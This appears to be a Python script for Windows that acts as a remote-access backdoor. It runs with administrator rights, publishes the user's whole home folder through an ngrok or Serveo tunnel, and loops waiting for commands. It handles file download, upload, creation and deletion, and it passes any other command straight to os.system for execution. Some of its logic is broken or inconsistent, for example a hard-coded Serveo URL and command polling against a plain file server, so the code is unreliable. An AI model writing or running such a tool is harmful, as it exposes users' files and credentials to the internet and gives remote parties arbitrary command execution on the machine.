import os
import subprocess
from multiprocessing import Process
import requests
import time
import argparse
from pyuac import main_requires_admin

@main_requires_admin(return_output=True)
def main():
    # Step 0: Save the default path
    default_path = os.getcwd()
    print(default_path)
    # Step 1: cd into user's folder in Windows
    os.chdir(os.path.expanduser("~"))
    print("CD'd into user's folder in Windows")

    # Step 2: Open up a local server using py -m http.server
    local_process = subprocess.Popen(["py", "-m", "http.server", "80"])
    print("Opened up a local server using py -m http.server")
    time.sleep(2) # Give the server time to start up
    
    # Step 3: Use ngrok or Serveo to expose that server publicly
    parser = argparse.ArgumentParser(description='Expose a local server using Ngrok or Serveo')
    parser.add_argument('--tunnel', dest='tunnel', required=True, choices=['ngrok', 'serveo'], help='tunneling service to use (ngrok or serveo)')
    parser.add_argument('--subdomain', dest='subdomain', required=True, help='Subdomain to use for Serveo tunnel. Leave blank if you are using ngrok')
    parser.add_argument('-p', dest='port', required=True, help='port for connection')
    args = parser.parse_args()

    #save default paths to resources
    ngrok_path = os.path.join(default_path, "Resources", "ngrok.exe")
    ssh_folder = os.path.join(default_path, "ssh")
    if args.tunnel == 'ngrok':
        ngrok_process = subprocess.Popen([ngrok_path, "http", "80"])
        time.sleep(2) # Give ngrok time to start up
        ngrok_url = requests.get("http://localhost:4040/api/tunnels").json()["tunnels"][0]["public_url"]
        print(f"Public URL: {ngrok_url}")

    elif args.tunnel == 'serveo':
        # Step 1: Check if ssh key exists, if not create one
        if not os.path.exists(ssh_folder):
            os.makedirs(ssh_folder)

        private_key_path = os.path.join(ssh_folder, "key.txt")
        print(f"Private key path: {private_key_path}")
        public_key_path = os.path.join(ssh_folder, "key.txt.pub")
        known_hosts_path = os.path.join(ssh_folder, "known_hosts")

        if not os.path.isfile(private_key_path) or not os.path.isfile(public_key_path):
            os.system(f'ssh-keygen -t rsa -b 2048 -f {private_key_path} -q -N ""')

        domain = "serveo.net"
        # Step 2: Get Serveo subdomain
        ssh_command = f"ssh -R {args.subdomain}:80:localhost:{args.port} -i {private_key_path} serveo.net"
        print(f"Running Serveo command: {ssh_command}")
        print("Forwarding HTTP traffic from https://envxsion2048.serveo.net")
        serveo_process = subprocess.Popen(ssh_command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE)
        # Step 3: Wait for subdomain to be ready and print URL
        print(serveo_process.communicate()[0].decode("utf-8"))

    # Step 4: Create functions to wait for a command from another script through the tunnel and make/delete/upload and download files
    def wait_for_command():
        # Wait for a command to be received
        while True:
            try:
                r = requests.get("http://localhost:80/command")
                command = r.text
                if command:
                    return command
            except requests.exceptions.ConnectionError:
                pass
            time.sleep(1)

    def download_file(file_path, file_name):
        # Download the file from the server
        url = f"http://localhost/{file_path}"
        print(url)
        response = requests.get(url)
        with open(file_name, "wb") as f:
            f.write(response.content)

    def upload_file(file_path, file_name):
        # Upload the file to the server
        url = f"http://localhost/{file_path}"
        with open(file_name, "rb") as f:
            response = requests.post(url, files={"file": f})

    def make_file(file_path):
        # Create a new file on the server
        url = f"http://localhost/{file_path}"
        response = requests.put(url)

    def delete_file(file_path):
        # Delete a file on the server
        url = f"http://localhost/{file_path}"
        response = requests.delete(url)

    while True:
        # Wait for a command from another script through the tunnel
        command = wait_for_command()

        # Check if the command is a download request
        if command.startswith("download "):
            # Extract the file path from the command
            file_path = command.split(" ")[1]
            # Download the file from the server
            download_file(file_path, file_path.split("/")[-1])

        # Check if the command is an upload request
        elif command.startswith("upload "):
            # Extract the file path from the command
            file_path = command.split(" ")[1]

            # Upload the file to the server
            upload_file(file_path, file_path.split("/")[-1])

        # Check if the command is a make file request
        elif command.startswith("make "):
            # Extract the file path from the command
            file_path = command.split(" ")[1]

            # Create a new file on the server
            make_file(file_path)

        # Check if the command is a delete file request
        elif command.startswith("delete "):
            # Extract the file path from the command
            file_path = command.split(" ")[1]

            # Delete a file on the server
            delete_file(file_path)

        else:
            # Execute the command
            os.system(command)

if __name__ == "__main__":
    main()
    admin_stdout_str, admin_stderr_str, *_ = rv = main()